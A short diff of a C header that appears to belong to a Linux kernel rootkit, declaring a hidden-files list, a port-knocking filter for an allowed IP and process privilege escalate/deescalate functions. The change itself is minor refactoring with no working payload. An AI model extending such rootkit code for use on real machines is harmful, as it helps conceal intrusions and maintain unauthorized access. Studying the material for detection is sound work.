@@ -18,8 +18,6 @@
 #ifndef CONTROL_HEADER
 #define CONTROL_HEADER
 
-#include <linux/list.h>
-
 #include "include.h"
 
 /* list for hidden files (full path) */
@@ -87,7 +85,7 @@ struct modules {
 struct port_knocking {
 	struct list_head list;
 	int port;		/* the port that is filtered */
-	int protocol;	/* tcp or udp */
+	int protocol;		/* tcp or udp */
 	int ipaddr;		/* the ip that is allowed to connect */
 };
 
@@ -210,6 +208,9 @@ escalate(struct escalated_pid *);
 
 int
 deescalate(pid_t pid);
+
+int
+control_loaded(void);
 
 void
 initialize_control(void);
